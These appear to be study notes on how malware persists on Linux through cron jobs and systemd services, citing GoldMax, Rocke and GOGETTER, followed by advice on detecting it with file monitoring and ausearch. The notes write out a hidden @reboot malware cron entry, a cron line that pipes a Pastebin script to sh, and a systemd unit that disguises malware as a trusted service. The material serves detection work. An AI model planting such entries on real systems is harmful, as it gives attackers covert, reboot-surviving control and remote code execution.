A lot of ways to persist in Linux, common ones are below

# Cron persistence 
- Cron jobs are scheduled tasks 
- Most popular persistence method 
- Example would be GoldMax where it can survive a reboot 
- They added a line in the cron job file located at /var/spool/cron/user
```
@reboot nohup /home/user/.hidden-directory/malware-name /dev/null 2&1 &
```

Another example would be the 
- Rocke cryptominer 
- Downloads the cryptomining script from Pastebin and installs it as a /etc/cron.d/root

```
echo "*10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
```

# Systemd persistence
- Systemd hosts the most critical system components 
- DNS, SSH, and nearly every web service are organized as separate file in `/lib/systemd/system or /etc/systemd/system

Example:
- Sandworm group created a cloud online service to enable its GOGETTER malware to run on reboot
```
# A simplified content of /lib/systemd/system/cloud-online.service file
[Unit]
Description=Initial cloud-online job    # Fake description to mimic a trusted                                                            service
[Service]
ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trusted                                                         file
```

# How do we detect these persistence on startup? 

Monitor both cron and systemd files as they are defined as text files 

Cron can be located at: 
```
/etc/crontab
/etc/cron.d*
/var/spool/cron/*
/var/spool/crontab/*
```

Systemd folders can be located at: 
```
/lib/systemd/system/*
/etc/systemd/system/*
```

Monitor related processes: 
```
nano /etc/crontab
crontab -e 
systemctl start|enable <service>
```

```
ausearch -i -f /etc/systemd -> file changes 

ausearch -i -x crontab -> execution of crontab command
```

and then we check crontab and its process
- In ausearch for crontab, take note of the CWD of the process to know what we are looking for
